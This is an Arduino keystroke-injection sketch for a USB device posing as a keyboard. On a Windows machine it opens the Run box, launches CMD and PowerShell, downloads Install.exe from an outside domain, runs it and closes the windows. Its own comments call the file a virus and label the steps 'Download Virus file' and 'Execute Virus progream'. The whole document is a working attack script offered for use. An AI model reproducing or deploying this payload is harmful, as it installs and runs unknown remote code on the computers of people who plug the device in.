
// w w w. 小空格 .com


#include <Keyboard.h> // Define all key

// Initia-liza-tion
void setup()
{

  // put your setup code here, to run once:

  delay(100);
  Keyboard.begin();   // Start

  delay(1000);

  /* Start keyboard simulation */

  // Open CMD window
  Keyboard.press(KEY_LEFT_GUI);        // Press LeftWinKey
  Keyboard.press('r');                // Press "R" key
  Keyboard.release(KEY_LEFT_GUI);    // Release LeftWinKey
  Keyboard.release('r');            // Release "R" key
  delay(700);

  Keyboard.press(KEY_CAPS_LOCK);  // Input mode
  Keyboard.print("CMD");           // Enter "CMD" in the RunWindow

  Keyboard.press(KEY_RETURN);         // Press Enter key once
  Keyboard.release(KEY_RETURN);

  delay(500);

  // CMD change into PowerShell
  Keyboard.println("POWERSHELL");
  delay(500);

  // Download Virus file
  // Download Link  https://xn--yet46zjio.com/CloudData/DATA/Install.exe
  // HTTPS://XN--YET46ZJIO.COM/cLOUDdATA/data/iNSTALL.EXE
  Keyboard.println("$CLIENT = NEW-OBJECT SYSTEM.NET.WEBCLIENT");
  Keyboard.println(" $CLIENT.DOWNLOADFILE('HTTPS://XN--YET46ZJIO.COM/cLOUDdATA/data/INSTALL.EXE') ");

  // test
  // Keyboard.print("HTTPS://XN--YET46ZJIO.COM/cLOUDdATA/data/iNSTALL.EXE");

  delay(1200);

  // Execute Virus progream
  Keyboard.println("D:\\INSTALL.EXE");

  delay(2000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.press(KEY_RETURN);         // Press Enter key once
  Keyboard.release(KEY_RETURN);


  // Close windows
  delay(1000);
  Keyboard.println("EXIT");
  delay(200);
  Keyboard.println("EXIT");
  delay(200);
  Keyboard.println("EXIT");
  delay(200);
  Keyboard.println("EXIT");

  delay(200);
  Keyboard.release(KEY_CAPS_LOCK);

  delay(200);
  Keyboard.end();   // End

}




void loop()
{
  // put your main code here, to run repeatedly:

}
